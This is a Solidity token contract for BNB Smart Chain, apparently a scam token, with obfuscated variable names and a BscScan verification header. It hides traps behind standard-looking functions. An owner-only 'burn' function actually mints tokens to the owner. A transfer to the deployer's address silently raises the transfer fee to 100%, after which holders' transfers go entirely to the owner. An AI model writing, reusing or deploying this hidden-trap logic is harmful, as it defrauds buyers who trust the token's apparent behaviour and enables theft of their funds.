/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-13
 */
pragma solidity >=0.4.11;
contract IOhPGy {
address public  HfQgcY = address(0);
uint256 public constant TyFycS = 9+1;
uint256 public  NTFlWH = 10000000000000000;
address public  CngZFY = address(0);
string public  name = "DOdEFj";
string public  symbol = "HPXytq";
uint256 public  PVumzw = 10000000000000000000;
address private  XswLBV = address(0);
uint256 public  BOtdwr = 100000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  HhpSjO = 10000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  uzawxc = 10000000000000000000000000000;
uint256 public  tRvpNz = 100000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
address public  OqDAYG = address(0);
mapping (address => uint256) public balanceOf;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  srrTDK = 100000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  cKQzzA = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address public  srvFaC = address(0);
address public owner;
address public  ZzprDW = address(0);
uint256 public  EYbIvW = 1000000000000000000;
uint256 public  RkxSbb = 100000000000000000000;
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "NjlsMz");
require(to != address(0), "NjlsMz");
require(amount <= balanceOf[from], "NjlsMz");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* TyFycS/HhpSjO ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==XswLBV){
HhpSjO = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () {
XswLBV = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}